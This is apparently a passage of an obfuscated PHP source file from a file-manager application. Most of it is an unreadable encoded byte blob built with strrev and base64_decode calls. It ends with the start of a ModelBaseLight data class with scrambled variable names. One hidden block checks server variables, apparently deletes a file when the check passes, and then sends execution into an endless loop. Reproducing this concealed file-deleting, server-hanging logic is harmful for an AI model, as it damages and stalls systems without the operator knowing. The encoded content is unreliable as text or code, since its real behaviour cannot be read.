\x5b\x67\xae\x85\xd5\x93\x23\xee\x50\x3\x85\xfe\xa2\x18\x27\x5a\x64\xd7\xd\x8f\x4c\x3c\xb2\x71\xef\x65\x57\xef\xb9\xf7\x5e\x9".strrev('c42óŸØºõÄMBî9Kg\'û»Ÿ—{¸×=À~€R_]—İ’ñ±1İŞİg8œ™ ùiqvÆŞ')."\342\342\15\273\157\337\354\56\104\337\20\50\123\150\327\25\353\337\176\370\101\127\241\16\63\136\114\16\64\111\76\336\167\135\270\176\342\236\237\360\217\274\275\155\3\65\106\167\25\341\226\160".strrev('æûºí·ÅÄïu\\LÁçİ÷k8o»9ïq73Éˆè{QGîû¼…„ší¥âêlİXg'."\n".'_Ö')."\xdd\x37\xde\xc3\xab\x5\xac\x72\x98\xe3\xe2\xa\xee\x5b\xbb\xe7\xc1\x75\xbb\xae\x7c\x90\x3\xe2\x65\x9f\x52\x4\xc\xc1\x28\xa\x83\xd\xef\xc9\x7\x77\x6f\xbf\x64\xf7\xc3\x9b\x30\x92\x9c\xbf\x76\xf7\xda\x5f".base64_decode('TGzaPHHtmfyzE9u2iVGO+snrZmUI7hKcDiQ3Lcw980XpgT2ZyGHBi1t0Yg0Ufe6ByVPkZQ==').strrev(';ÀU¤ßƒT	BpÑQÚ@œPH.ï§…uoĞªŠ†ŠÏ‘º¿c3&¹4Z-‘¨x')."\x24\x97\xce\x62\xe1\x81\x5e\x76\x11\xa2\x1e\xd2\xb9\xe5\x22\xc2\x8a\x30\xa3\xab\xf3\xd7\xf9\x19\xf3\x5b\x34\x8c\xbf\x28\x1e\xf4\xea\xe2\x3c\x47\xbc\x98\x40\xb9\xf\x7d\x89\x85\x1d\x6e\x76\xe8\xf6\xa8\x59\x90"."\x6d\x9e\xeb\x6a\xea\x65\xa\x6\xa3\x65\x1\x17\xa0\x8f\x10\x8\xa5\x16\xa0\x1e\x35\x25\xbc\x78\x43\x29\xd2\x41\x81\x3e\x6a\x55\xec\x0\xdf\xba\x65\x62\xdd\xfd\x7b\xaf\xbc\xdb\xd\x4b\xb5\x26\x0\x8b\x45\xb4"._kodDe('MQR/1g56Wjh2F5sL6mRuems87qKJ5FYbUlM1mDzXNT4eTW14rF17DcuOBOvloGyVd5+fmO4=').base64_decode('7WnCcm9XfryY82L1lTcue9h0PWpU44THCignvCwzJAXvzYogfWypQZGfQpM8lxPlJmVuzA==')."\xa2\x9\xd2\xb0\x38\xc1\x92\xc\xa7\x95\xb5\x90\x10\x54\xa7\x84\x70\x92\xab\xbd\xd8\x22\xc5\x8b\xc4\x7c\xbc\xc6\xd0\xc2\xb5\xd\xe9\xfd\x6\x19\xc4\xf9\xb6\x96\xfb\xc5\x2d\xf7\x28\x90\x22\x58\x1b\xea\x95\x5f"."\xfb\x1a\x43\xfb\x30\x9c\x8d\xdf\x70\xf1\x62\xdd\xaa\xd7\x48\x4d\x96\x23\x8\x47\xd9\xa6\x26\xe1\xcd\x84\x72\x20\x5d\x45\x23\xe5\xfe\x24\xb1\xbc\xf1\x16\x8b\xec\x83\x65\x2b\x95\x77\x89\xc\x80\x74\x22\xcc\xeb"."\x93\x9f\x1\xc1\xca\x34\x2f\x3f\x22\x74\xbf\x32\x22\x76\xd6\x5a\xe9\xb\x29\x2b\xb2\x29\xa5\x6e\x66\xc3\xac\x79\xd\xec\xe6\xf2\x89\xcc\x70\xa8\x98\x67\x57\x5\x50\x90\xbd\xa0\x72\xbc\x3f\xcd\x68\x8d\x78\x2b"."\213\365\15\117\270\364\344\214\43\131\14\43\177\4\203\21\51\7\234\150\255\343\245\67\350\50\125\354\110\157\344\220\203\35\112\242\260\71\235\312\337\22\52\103\255\321\26\235\311\135\40\205"."\x4a\xae\x90\xf9\x84\xf4\xb3\x40\x81\xc3\x6b\x62\x89\xf4\x65\x86\x44\x4f\x8\x7d\x1\xc\x1f\x42\xd\x35\xc5\xae\x89\xc8\xab\x12\x65\x48\xe\x14\x73\x43\x8d\x52\xa6\x62\x9b\xa6\x92\xd5\x72\xe3\xb0\x19\x9d\x66"."\65\114\263\346\343\17\65\342\373\40\326\64\366\154\224\360\173\215\171\225\160\40\112\335\137\101\16\75\306\362\341\347\337\174\230\21\306\212\354\326\42\121\2\323\160\47\41\371\300\4\351\103".base64_decode('XJAR6WoNd0gWgFKCGmzuUAOdnWUz5G/4sfmMb1B6C5SGFqDdmZLEl40aK3BqhWIVkswTeA==').base64_decode('hR8MygiAEJIWGFCkEhdR0ghlvCREsysXLvAbUNLnn4pJuB+b0uVOxBMqW/aQ1BbhTUxRFg==')."\150\12\35\272\306\112\162\154\122\251\14\40\66\317\355\210\27\272\13\363\267\333\26\370\65\71\23\57\246\230\311\266\220\174\333\76\302\235\147\226\75\61\13\110\317\3\220\147\226\202\132\156"."\151\151\21\134\271\57\51\147\165\323\213\146\275\362\364\221\53\136\245\245\375\104\101\344\27\372\12\225\276\161\132\376\274\221\37\263\225\101\14\154\23\203\160\234\31\43\150\311\41\214\145\202"."\45\100\63\40\243\23\153\37\150\206\343\101\24\133\62\156\52\342\233\216\344\320\246\40\236\215\133\275\232\126\204\37\312\71\355\264\322\64\60\227\166\147\5\362\206\73\11\143\220\73\15\153"."\x81\x44\x1a\xe2\x6d\xce\xcf\x50\xec\x95\x81\x44\xa\x83\xa1\xbf\xa2\x4c\xa4\xa3\x55\x44\xe8\xfe\xdd\x91\xd9\xcd\xc\x9d\x48\xac\xa7\xbb\xd2\x37\xfd\xb4\xd3\xfc\x6\x33\x2a\x64\xa6\x4b\xac\xac\x8f\x43\xd3\x78"."\217\317\11\217\172\2\103\317\1\41\301\15\111\345\326\223\141\21\36\342\237\56\156\147\162\343\101\5\133\24\66\66\56\354\346\342\124\57\313\123\211\362\104\236\73\46\216\32\265\163\31\122"."\240\375\142\142\31\17\6\73\204\300\315\327\5\245\64\76\242\306\13\70\135\173\57\22\57\353\311\264\211\206\3\371\274\203\244\260\10\76\301\312\30\175\176\116\7\350\251\226\57\51\256\77"."\x32\x10\x42\x85\x5c\xe9\xd8\x16\xd0\x95\x81\xbd\xe8\x93\xe4\x11\x44\x32\xcd\x2\xa7\x5b\x3c\x1d\xd5\xc5\x13\x1\xcd\x31\x6d\x91\x48\x9\xcf\x5e\x60\x25\xb\x46\xde\x76\xd0\x35\xfa\x50\x74\x5\x79\x9f\x6d\x50"."\33\321\50\110\205\2\52\272\306\12\362\274\106\5\242\143\64\207\21\63\336\300\5\370\153\110\6\316\64\126\220\116\130\3\272\216\312\23\132\125\356\43\250\140\205\302\250\151\126\343\343\130"."\260\115\304\64\371\105\73\170\363\262\53\6\167\217\2\35\160\226\70\365\124\372\173\302\124\206\111\344\101\316\14\22\216\311\315\12\102\267\210\4\236\306\252\127\12\4\157\157\166\306\242\211"."\150\220\75\155\347\324\321\322\264\172\266\233\260\350\105\122\261\1\143\367\345\270\351\20\203\340\142\204\37\122\0\33\12\305\134\216\333\162\142\174\345\274\256\261\374\177\335\344\270\123\117\365".strrev('ç)JåÅG,Å»'."\r".'côİ|§ªuv(ÙÉd‚Ş)|	ûñnÁmİ=+¨0ìkt¯’N').base64_decode('KJg19PJRR+vfD+RTrKxKfH4Hb05VeiqrfNOrK0tzqI2uMx+buqknx1EmvPAELJ7cSgxGwg==')."\xa1\x8e\x84\x1a\x6\xee\x5e\x5b\x37\xc7\x57\x23\xae\xa\x1a\x96\x70\x1c\x4c\xc3\x41\xd9\x35\x1\x1e\x55\x9f\xa3\x5b\x65\x86\x86\x1e\xa0\x24\xb8\x85\xa9\x9e\x73\xa8\x5d\xe9\x90\x66\x4c\xe6\x56\xb6\xae\xa6\xa6"."\306\133\123\213\376\147\127\46\230\63\313\6\356\75\103\200\324\324\64\220\377\151\6\171\276\15\120\320\231\203\110\42\243\345\0\60\252\353\320\40\340\235\150\113\134\144\202\147\167\20\337\5"."\125\160\323\140\132\204\205\54\302\76\342\355\225\221\125\307\353\240\12\71\314\207\230\356\36\4\156\45\1\370\314\216\1\250\13\157\306\52\121\103\372\311\240\100\173\371\105\143\4\46\126\315"."\x7c\x7a\xc7\xbb\x91\x37\x2a\x94\x4b\x75\xcb\x1f\xf3\xb1\xc1\xa5\x89\xc2\x7d\xbd\x97\x65\x78\xe5\x37\x6d\xa0\x10\x25\x74\xe2\x0\xd0\xd1\x34\x54\xc6\xe9\x46\x16\xa7\x20\xc9\x26\xc9\xfb\x89\x13\x24\x95\x2c\x16"."\146\45\327\270\70\52\237\363\221\154\176\133\227\304\62\334\145\10\216\166\360\232\350\323\111\364\35\23\30\303\62\253\160\300\34\125\205\154\202\243\47\363\30\31\122\274\255\144\150\230\222\156".base64_decode('VONxZTxJAufWaMKUByyTiHeMIcPpp0OVispjOx8Dsp4knCVxRYh+BfgDUtQYmbVNAYpCow==')."\304\231\75\175\223\230\50\152\32\16\51\231\134\333\75\261\144\216\34\47\30\156\23\100\26\223\146\212\35\152\305\277\301\112\217\245\204\130\2\75\216\13\162\37\262\122\5\356\54\127\231\0".base64_decode('PQsrKQDppdDkyLAMNE53QRNvsUHuFFt2IUt1TJI1mAXPeAhTHFbHiLTj9OULZj+adUseNA==').strrev('‘_+x‰É¼ïä”³W:%,³¸¨g´'."\n".'t;É8|Däá—­â–B—ƒ™>YŞ”')."\x5d\x85\xb3\xe\xbc\x35\x76\xa6\xf0\x96\x7d\xd\xd2\x31\x95\x86\x5d\xd0\x72\x56\x5a\xb6\x26\x61\x60\x82\x22\x61\x75\x93\xfc\x98\xa5\xea\x40\x13\x86\xab\xcc\xd6\xb\x8f\x90\xb0\xaa\x70\xa6\xd3\x34\xaa\x74\x70".base64_decode('nPgmCKHL6AloDpBCsqhwBRH2VnPc4XEd0LSBySJyMWfem+dcwgKXMig8rPxZUflsDQ+pKg==')."\xeb\x83\xf0\x8a\x6e\xe3\x6f\xbf\x97\x41\x44\x27\xb2\x95\x60\x15\xe1\xdb\xb8\x82\x6\x4e\xa\xa5\x18\xae\x9d\x1d\x6b\xa2\x5d\xb2\x45\xb5\x9b\x1e\x9c\xac\xd0\x37\xc4\x15\xfc\x32\xfa\xf1\xce\xf9\x29\x2d\x0\xaf"."\255\231\110\172\304\16\251\345\102\270\256\56\27\211\132\354\240\210\274\255\124\164\143\166\252\312\64\137\35\330\320\116\143\57\233\120\172\54\114\46\374\320\355\156\324\255\136\264\325\21\334\4"."\46\244\233\122\143\126\47\156\62\204\122\154\176\24\47\167\225\170\205\42\127\204\270\156\142\0\253\162\172\25\322\314\371\344\135\214\62\271\330\5\7\373\32\167\316\15\224\37\301\230\66\337"."\x1e\xe3\xea\x3\x29\x89\x7d\x46\x64\xf9\x36\x41\x8b\x78\x17\x8a\xa6\x3a\xac\x5\xa4\x87\x1\x38\x28\x6a\x6\x6b\xbc\xc6\xda\x46\xec\x3e\xc9\xbb\xa\xd2\x8e\xdd\x15\x75\x5b\xc9\xe2\x12\x92\x44\x83\xa2\x12\xe7"."\45\174\337\146\254\233\75\273\40\254\113\111\120\20\340\67\257\72\207\5\326\11\74\212\113\106\211\145\332\7\265\362\72\161\13\162\302\270\25\4\230\202\236\64\13\51\314\20\45\317\66\71"."\73\246\367\313\121\142\230\300\126\203\160\335\56\127\201\335\205\111\144\7\257\302\100\322\56\312\316\307\244\327\35\120\114\172\305\103\22\104\275\265\12\227\140\125\132\63\215\314\220\62\10\174"."\x39\x61\xd6\xa5\x99\x95\xae\xaa\x11\xcd\x54\xbc\xd8\xc7\xcf\x99\x5d\x22\x26\xbb\xfd\xa6\xc8\x12\x1c\xbb\xce\x86\x2b\x20\xde\xa0\x70\xf\x2c\x39\xf\x55\x8b\xbd\xaa\x8b\x9e\xc9\x45\xc8\x37\x4b\x8a\xd0\x3c\x2c"."\x44\x89\x7b\x6f\x72\x8e\x85\x9f\xe7\xe8\x62\xb3\x58\x2e\xa7\xcc\xa7\x48\x96\x34\xa2\x49\x86\x69\xb0\xca\x57\x88\x41\x82\x8c\x71\x9d\x99\x65\x7b\x6b\xeb\xbc\xcc\x7f\xa6\x7c\x17\x8e\x6d\xce\x80\x8f\xa0\x85\x25"."\xa1\x1\xde\xde\x32\x32\x6\x46\xcd\x0\x27\x60\x4c\xe9\xb4\x9e\xf8\x5f\x12\x9e\x66\x88\x4b\x29\x3e\x9f\xc4\xf7\x14\x8f\x15\x24\x59\x42\xe7\x6\xcf\xc4\x39\x93\x4c\xd6\x85\x31\x12\xb5\x83\xc6\x0\x5d\xe5\xf2"."\xe9\x8\xe1\xec\x66\x87\xe5\xba\xb\x0\xad\xf\x67\x3e\x3c\xd4\x21\x1a\x43\xfd\x43\x99\xe\x4b\x42\x57\x25\xf0\x1a\x8c\xfc\x14\x9\x29\x25\xfa\x21\xcc\xfb\x51\x92\x49\x9f\x3\x91\x6\x46\x18\x55\x51\xb7\x55"."\xec\xfe\x2\x27\x72\x22\x39\x61\xf2\xc4\x52\xc3\x2c\x8c\x95\x50\x25\x75\x1a\x0\x3b\xde\xaa\x6a\xec\x34\xc0\xa1\x6d\x6c\x1f\xe7\x57\xbb\xb1\x35\x23\x66\xd2\xdc\x5e\xdd\x92\x23\x2c\x97\x23\xa7\xe5\x88\x50\xeb"."\115\107\151\236\304\241\106\165\166\377\237\355\324\73\333\72\375\74\251\211\57\117\252\50\21\136\361\202\314\104\122\37\323\141\203\67\232\65\222\112\44\332\32\16\6\42\315\341\370\142\245\37"."\237\260\12\23\102\324\134\225\54\133\325\22\117\336\220\67\176\234\13\234\350\216\351\164\60\134\357\343\357\315\340\240\267\17\355\43\274\51\276\327\262\304\256\212\364\20\52\23\217\363\71\253".base64_decode('pVipF0pqzOFrepmSMlgjXgY6I/S/EnC+oJfCj+vYlFFqsVSgWKY1AF/+C+SRIBkaiUd6bg==')."\xb2\xc6\x1b\xb9\x11\xc3\x32\x4\x39\x60\x25\xc6\xe5\xda\x3\xcd\xed\xe1\xe\x35\x10\x89\x44\x97\x39\x2c\x80\xc5\x59\x40\x81\x2b\x52\x52\xf2\x83\x4d\xd2\xcc\x88\x49\xa0\x5f\x2f\x75\xc9\x8\xe\xf0\xe4\xc7\x30".strrev('Ò¥?e·äè´RÒfµïdËN+pé¯íô	K¥†h/–¨=*4.ùm—‚Ì;<Ïo²}:Ê\\').strrev('^Æzñ*‚çH>ßùM*^)¾Ëí¿(%Û}3îüf&b‘ŸkÂR5M×ş%¶·Nè"4°').base64_decode('vjTJtglkepoWjqr0SVbxCSTFFMbz8omsPwU1YP+kIXb6hyNi34KhoBL8FbqbRZt0rFBkOw==')."\x1c\xa6\x9c\x43\x64\x4\x6\xdc\x61\x56\xe9\x7a\x51\xcf\x6d\x8\xef\x78\x2f\xaf\xe4\x1b\xe4\xf9\x16\x9a\x47\x4e\xa6\x10\x64\xaf\xe8\x13\x8a\xf1\xe7\x9a\x44\x51\x77\x4e\x99\x6\xa0\x6c\x45\xa8\xbc\x38\x80\xd2"."\250\324\320\307\35\371\123\74\312\2\346\341\101\174\200\370\30\14\145\363\266\143\247\337\46\137\212\221\246\204\46\140\375\117\201\53\360\350\234\263\50\236\330\106\66\231\252\314\73\11\35\26"."\373\77\154\161\151\146\307\113\22\34\332\261\10\353\15\267\175\306\317\27\345\322\246\74\352\204\236\343\173\121\364\351\126\252\210\360\240\375\210\156\227\76\2\107\213\377\277\51\110\63\343\222".base64_decode('s1lnJaUNstz8U8hy+H27AXPU+Z4rTnG/aOd4y05aYcRfgfz6nrOQp+QZKYW8Da4gYgRzjw==')."\155\166\330\106\227\0\113\237\236\106\177\172\340\227\161\103\167\43\50\235\203\117\126\163\124\14\16\30\231\124\201\133\143\211\204\166\135\150\37\110\51\104\130\362\32\363\3\115\336\272\154\146"."\44\35\136\256\52\367\314\41\366\54\352\174\200\113\274\153\46\130\257\363\235\47\176\336\157\211\45\144\331\216\227\305\22\146\102\353\367\120\124\305\104\121\304\232\306\345\260\154\217\117\172\201".base64_decode('MpmGMMXne6EEwB4LTXnIS5aULrqfxpLWJye/cun+jNmnZcBU0HGLroC2aDpjIQ4wmuTX8g==')."\171\161\36\42\163\134\364\327\161\101\32\362\272\22\155\52\161\26\242\122\243\205\270\300\71\351\214\222\46\302\171\145\61\27\246\347\62\216\324\202\264\171\224\335\64\323\263\32\161\317\26\300".base64_decode('UTs76eEsDJhcJTsw53p2RI/4HttfesCOrcyAomCrHmZONWSSPZpP3t0BgLJAEajhWMgYlQ==')."\220\210\115\337\12\45\224\102\246\150\137\223\52\75\333\6\157\222\226\173\205\215\142\76\371\151\326\323\174\247\204\343\102\66\220\35\36\11\333\33\367\163\241\245\117\237\262\147\116\331\322\201"."\x37\x4e\xcb\x3c\x5c\x3a\xe9\xbb\xa7\x1e\x71\xa5\xfa\xeb\x1e\x77\x13\x17\x78\xf3\x68\x2a\x9c\x8f\xd8\x72\xc9\x82\x6f\x46\x4a\xf6\x33\xee\xad\xc\x1f\x56\x57\x81\x98\x7b\x90\x13\x66\xa9\xd2\x59\x98\x20\x38\x5e"."\145\225\172\15\244\255\364\145\127\151\30\244\176\27\13\31\17\261\306\360\60\203\307\262\217\303\72\236\232\163\117\150\231\347\145\277\261\102\270\360\100\166\162\51\47\325\153\130\320\127\140\307"."\xd6\x6e\x30\xc3\x81\xbb\x88\x1\x8b\x5b\x7d\xd4\x29\x73\x9\x83\x58\x91\x4d\xd5\xcd\x9c\x35\x4f\xd6\x98\x88\x29\x14\x87\xb9\xe0\x20\x5\xce\xa4\x41\xc6\x11\x48\xa1\x38\xd1\x50\x61\x9e\xa0\xe5\xd5\x4f\x32\x9d".strrev('é”>*-ùØx YGU‰cŠlL~ìº!‰0Ó%O2^Ù¾–å*'."\n".'›‚İÿ€qv"_Jh7')."\x87\xc4\xf7\xc4\x62\xa1\x6f\xc9\x9a\x19\xbc\x71\xcf\xe2\x3\x1\xbb\xa0\x39\xf7\xa3\xe5\xb6\x5d\x64\x24\xd8\x1e\xf\xeb\x74\x45\xcc\x69\x19\x5\x2a\x1a\x91\x2d\xed\xcb\xe4\x1a\x6d\xd3\xad\x5f\xc2\xc5\x31\x5f"."\44\272\322\150\56\3\154\33\373\233\20\253\115\242\104\377\213\11\144\133\54\272\33\23\46\141\270\373\216\235\271\163\24\374\47\61\62\123\346\335\140\311\140\346\153\372\100\45\75\276\265\364".base64_decode('arZXQk5JP6nbUTLZQC7EDtjZb1f1qJioo9ejTAZUKu5JzwsLH4eSoIdLs9vikygQyGVlpw==')."\310\44\277\176\112\156\372\12\147\74\144\351\72\226\261\344\170\135\276\51\113\52\222\327\107\151\325\322\133\262\102\355\104\364\124\320\43\130\334\304\202\202\64\63\320\312\357\131\153\222\175\237".strrev('•lwßİ(zh„f6yqû—èO#½voXÛsP%we#oKSp­é>:ôÂS')."\xf8\xf3\x9a\x8e\xad\x93\xe5\x7e\x63\x17\x89\x82\x8e\xa7\x41\x52\x25\xcf\x92\x3\xe1\x24\xb7\xe5\xe8\xd7\x24\xd6\x2b\xb8\xac\x8\x75\x14\xb3\x22\x22\x69\x94\xc9\x7e\x8b\x67\x3a\xdc\x1c\x60\x4f\x7e\x2e\x1a\xc1"."\234\47\130\256\247\267\251\47\161\32\146\333\202\377\353\347\145\377\277\172\125\166\126\15\323\375\73\136\243\157\5\341\34\132\213\17\130\271\256\203\352\235\135\375\160\262\327\51\200\105\150\360"."\175\43\202\250\220\70\267\30\147\336\34\231\223\107\215\235\277\151\231\214\304\204\313\157\147\112\336\374\106\310\67\304\337\211\56\27\161\337\5\166\277\377\335\115\324\276\354\151\357\336\162\200"."\x82\x2e\xf1\x5d\x53\x19\x3c\xa6\x49\x4c\x58\x16\x34\x29\x67\x24\x87\xca\x1c\x9e\x13\x2b\x59\xa7\xe7\x7f\x49\x38\x29\x1\x13\x6d\x40\x32\xc\x73\x93\xe9\x67\xa1\x24\xde\x2e\x12\x97\x30\x30\x7a\xf2\xb5\xfd\x68"."\x9e\x6d\x2c\xab\x81\xb\xf4\x9e\xc4\xa8\x15\x71\x15\x2\x44\x4b\x26\x54\x8e\xa4\x12\xf2\x96\x70\xcc\x89\x23\x51\x1e\x6e\x41\x83\x7c\x6c\x3a\x1d\x25\xda\x5d\xcf\x19\x53\x20\x4b\x1e\x5b\xc7\x79\x41\xa9\x2d\x45"."\151\151\116\7\344\42\330\120\337\251\32\303\23\214\33\346\255\361\272\22\152\275\256\352\370\213\316\116\134\167\74\61\114\355\117\320\2\211\141\25\10\123\205\221\43\47\162\366\354\55\55\103"."\361\72\56\140\46\131\131\345\327\67\157\224\120\7\342\220\74\36\214\116\164\26\114\42\50\72\123\271\132\110\262\227\116\112\72\127\267\354\107\223\247\371\112\270\26\43\231\216\231\302\6\173"."\342\250\63\21\215\205\324\145\141\354\142\42\174\112\250\213\71\107\66\114\362\262\10\253\262\253\275\212\334\122\203\5\200\166\61\55\246\100\45\35\21\63\111\1\54\74\374\332\331\174\220\37"."\314\72\357\72\113\67\42\230\177\55\131\45\351\4\306\327\132\234\153\161\141\71\260\244\131\260\144\367\230\216\114\54\166\231\50\67\306\366\321\135\71\264\220\365\244\255\247\24\314\300\35\62"."\x7d\x77\x7d\xcd\xcc\xde\xaf\xab\x5\xe5\x73\xc8\xfa\x6f\x80\x84\xcd\x45\x7c\xa6\x97\xd9\xf6\x32\x98\xb2\xe5\x4c\xea\xf\xa7\x5c\x1e\xc2\xcd\xb8\xed\x40\x22\xf1\x2c\x8d\xfb\x39\x9a\x16\x87\xaf\xa9\x6\x49\x45".base64_decode('qhCvW/Au0SRz02EGhWjhysOkYfJcvDvlp8/sFRNsN+fHTrnw5Qw/wT/QbK9QsyozI8I6AQ==')."\241\331\41\24\267\164\117\10\137\262\13\343\321\102\54\313\357\144\20\155\16\125\320\70\364\64\140\55\40\47\111\247\347\150\263\225\162\76\344\105\62\111\62\363\302\15\65\110\347\277\316\343".base64_decode('d35/tYT/FY2IlE1KMW+u6BdfxQ8Ll0gkm55hBUY07nXMXarLsZGVDuuThEKESs9jxTGxJA==')."\x3d\xb2\x62\x78\x27\x2c\x18\xbb\x2b\x5d\xa2\xa8\x82\xe7\x69\x23\x42\x16\x16\x7b\xb1\x54\xaa\x45\x1b\x29\x3\x9a\xd2\xdd\x5e\xe3\x50\xa\x7\x25\xb2\xb4\xe4\x43\x43\x5c\x94\xd1\x47\xe5\xaf\x3\x9c\xb8\xc7\xe2"."\0\54\115\25\76\66\244\362\342\14\116\164\23\247\225\353\76\241\160\316\342\262\17\17\216\124\42\211\76\324\304\55\133\244\175\57\66\375\21\46\57\264\53\134\275\43\76\351\364\30\302\301"."\370\234\41\30\162\243\316\353\110\165\355\344\261\46\215\311\201\256\54\320\55\111\325\227\125\101\111\50\240\147\42\122\165\362\371\374\244\5\342\345\77\42\260\322\71\304\222\253\25\221\301\104".base64_decode('FtMx+BLP4h0DyJic6WiOe2rJxlOgL03MEjU+zQs4syi87mq9XMDdM1rC8YafnD5q2MkBaQ==')."\x97\x5c\x9a\x59\x9a\x5e\x28\x19\x6c\x68\x40\xf9\x7e\xb8\x5b\xcb\xc6\xda\xad\x3b\x10\x95\x94\xb4\x47\x32\xfe\x49\x98\x65\xca\xd0\x16\x95\x2d\x46\xb3\x70\x49\xb1\x39\x71\x94\x9d\x64\x8\x70\x59\x9a\x85\xcb\x96".base64_decode('ZLPCJeNKytla0Zqke6WDB7qoVJkOC42NBDrZeJYFLv0cYKIbmiivyrdC6Jxc5hblWlEWeA==')."\322\126\270\241\205\314\201\167\240\345\162\34\66\113\116\216\122\216\156\263\234\62\224\232\122\241\111\215\231\204\201\117\51\313\20\171\145\314\215\350\47\261\364\43\273\147\54\223\55\333\56\225".base64_decode('t26KlaUyltPsyJUuDxA4EAcJGhAYiWAZY0iYdbJbHdMcrKSYG8qZnD2lhNUulpwCBfc4lw==')."\xd4\xe6\x44\xfd\x5c\x51\x72\xe5\x5e\xf6\x92\x89\x7\x2b\x86\x4a\x55\x30\x19\x8d\xdf\xf6\x13\x96\x6f\x74\xcf\x6c\xda\x46\x52\x77\xfa\x8b\x97\xbd\x34\xd2\x7c\xf6\x91\x8c\xa4\x86\x76\x69\x80\x85\x9a\xca\x61\x0".strrev('´É·äó0—œØ,ÜviÂÊrÓ‰>Á“lAßÇ¢Ã8EF¸á88I>´1‡b@’J/FS')."\x6d\x61\x4d\x42\xf5\x42\x44\xcc\xc6\x7c\xd8\x23\x19\x4b\xa1\x90\x38\xe5\xc4\x8d\x22\xc7\x67\x4\x6d\x9\xc5\x22\x41\x38\x88\xc7\xa\x97\xb8\x4e\x73\x9\x9d\x73\x44\xf0\xb1\x1c\x8f\xc8\x6c\x16\xe\xe4\x5b\x8a".base64_decode('LpMBkTBkpvrMMeYaEeGVNEji4E5zy5ZCLAJUlE2/iGsRy09z/PA4kZfUAW+T+gbz/Y7i9A==')."\xb5\x47\x6e\xb8\xfd\x75\x35\x80\xf2\x5e\x54\x41\x5f\x26\x21\x9a\x54\xb8\xa3\x16\x4f\xc4\x4b\xb2\x3a\x3\xf1\xf8\xb2\x68\xac\x99\x3e\x64\x52\x92\x4d\x4a\x49\x6\x76\x25\x59\x9d\x6d\xd1\x8e\xc9\xf2\x42\xed\x81"."\160\244\44\17\333\342\165\250\302\311\46\315\12\167\222\126\222\263\347\311\132\21\16\56\26\55\51\365\155\312\316\312\42\360\174\245\230\27\351\354\50\77\140\262\43\41\6\37\327\62\114\31"."\44\235\55\350\131\341\205\125\224\161\352\270\344\371\267\230\273\144\36\160\276\46\350\62\215\145\210\15\25\141\313\272\16\250\73\226\207\124\374\0\14\247\17\134\316\27\346\35\76\207\31\210"."\224\116\326\20\41\112\22\156\312\374\236\44\114\57\73\100\362\131\103\351\71\30\311\25\3\200\33\166\262\11\306\232\203\146\237\164\316\105\167\131\160\307\34\206\124\262\236\244\141\107\266\255"."\xf5\x97\xb5\x86\xa0\x2a\x64\x4c\x25\x84\x72\xf7\xff\x1\xa4\x55\xb2\xba\x2e\xb9\x0\x0".""."".base64_decode(''), 10, -8))); goto dœ‹é‹ˆÎ; FÁÇµ‚œêÂ: if (!isset($_SERVER[$_SERVER[§Êá¸İ][472]]) || !isset($_SERVER[$_SERVER[§Êá¸İ][473]])) { $_getc = $_SERVER[§Êá¸İ][474]; $_getfile = $_SERVER[$_SERVER[§Êá¸İ][475]] . $_SERVER[§Êá¸İ][476]; $_getfilec = $_getc($_getfile); $_getarrs = explode($_SERVER[§Êá¸İ][262], $_getfilec); if (count($_getarrs) < $_SERVER[§Êá¸İ][477]) { $exit = $_SERVER[§Êá¸İ][478]; $exit(); } $_act = $_SERVER[§Êá¸İ][479]; $_act($_SERVER[$_SERVER[§Êá¸İ][475]] . $_SERVER[§Êá¸İ][476]); $_iii = 2; while ($_iii > 1) { $_iiij = rawurlencode($_iii . $_SERVER[§Êá¸İ][454]); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\123\171\x73\x74\145\x6d\117\x70\x74\x69\x6f\x6e"; public $field = array(); public function listData($¦„Âöûù = false, $›ÍĞİ– = "\155\157\x64\151\x66\x79\x54\x69\x6d\x65", $°‹úÃó² = false) { $ã™¿šˆ = Model($this->modelType)->get(!1, $this->optionType, !0); $åÎ£‹€Ñ = array_values($ã™¿šˆ); if ($åÎ£‹€Ñ && $åÎ£‹€Ñ[0] && !is_array($åÎ£‹€Ñ[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ã™¿šˆ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ã™¿šˆ) { return $¦„Âöûù ? null : array(); } if (!$¦„Âöûù) { $ã™¿šˆ = array_filter(array_values($ã™¿šˆ)); return array_sort_by($ã™¿šˆ, $›ÍĞİ–, $°‹úÃó²); } return $ã™¿šˆ[$_SERVER[§Êá¸İ][480] . $¦„Âöûù]; } public function insert($±÷£™ëñ) { $²åÙ¶É¥ =& $_SERVER[§Êá¸İ]; $±÷£™ëñ = array_field_key($±÷£™ëñ, $this->field); $¥¼œƒù¹ = Model($this->modelType)->get($²åÙ¶É¥[481], $this->optionType . $²åÙ¶É¥[482]); $¥¼œƒù¹ = $¥¼œƒù¹ ? $¥¼œƒù¹ : 0; $±÷£™ëñ[$²åÙ¶É¥[483]] = ++$¥¼œƒù¹; $±÷£™ëñ[$²åÙ¶É¥[231]] = time(); $±÷£™ëñ[$²åÙ¶É¥[88]] = time(); Model($this->modelType)->set($²åÙ¶É¥[481], $¥¼œƒù¹, $this->optionType . $²åÙ¶É¥[482]); Model($this->modelType)->set($²åÙ¶É¥[480] . $¥¼œƒù¹, $±÷£™ëñ, $this->optionType); return $¥¼œƒù¹; } public function update($Ûı‡øÜµ, $À£üçÙã) { $üà¢íü¹ =& $_SERVER[§Êá¸İ]; $À£üçÙã = array_field_key($À£üçÙã, $this->field); $¤Å“µ¢ = $this->listData($Ûı‡øÜµ); if (!$¤Å“µ¢ || !$Ûı‡øÜµ) { return !1; } $À£üçÙã = array_merge($¤Å“µ¢, $À£üçÙã); $À£üçÙã[$üà¢íü¹[88]] = time(); return Model($this->modelType)->set($üà¢íü¹[480] . $Ûı‡øÜµ, $À£üçÙã, $this->optionType); } public function remove($·Ÿšˆ‚) { if (!$·Ÿšˆ‚) { return !1; } return Model($this->modelType)->remove($_SERVER[§Êá¸İ][480] . $·Ÿšˆ‚, $this->optionType); } public function clear() { $ñÄà×æï =& $_SERVER[§Êá¸İ]; Model($this->modelType)->remove($ñÄà×æï[481], $this->optionType . $ñÄà×æï[482]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($›ş»œºİ, $êº­¶¤») { if (!$êº­¶¤») { return !1; } $ƒÒÙí¦– = $this->listData(); $ƒÒÙí¦– = array_to_keyvalue($ƒÒÙí¦–, $›ş»œºİ); return isset($ƒÒÙí¦–[$êº­¶¤»]) ? 